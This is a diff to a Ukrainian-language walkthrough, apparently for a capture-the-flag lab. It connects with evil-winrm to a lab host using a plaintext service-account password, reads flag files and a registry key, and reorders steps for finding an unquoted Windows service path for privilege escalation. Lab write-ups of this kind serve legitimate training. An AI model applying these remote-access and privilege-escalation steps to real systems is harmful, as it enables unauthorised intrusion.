@@ -141,24 +141,19 @@ sudo apt install -y libreadline-dev ruby-dev ruby-full && sudo gem install evil-
 evil-winrm -i 10.10.50.150 -u svc_deploy -p 'Deploy@2024!Drone'
 ```
 
-Всередині evil-winrm — Flag_9 (в admin_notes.txt):
+Всередині evil-winrm — знайти unquoted service path (без admin):
 ```
-type C:\Users\Administrator\Documents\admin_notes.txt
+sc.exe qc DroneUpdateAgent
+```
+
+Flag_9 (в ProgramData — читається без admin):
+```
+type C:\ProgramData\DroneOps\admin_notes.txt
 ```
 
 Flag_10 (реєстр):
 ```
 reg query HKLM\SOFTWARE\DroneCorp\UpdateSync
-```
-
-Знайти unquoted service path:
-```
-wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
-```
-
-Перевірити права на запис:
-```
-icacls "C:\Program Files"
 ```
 
 ---
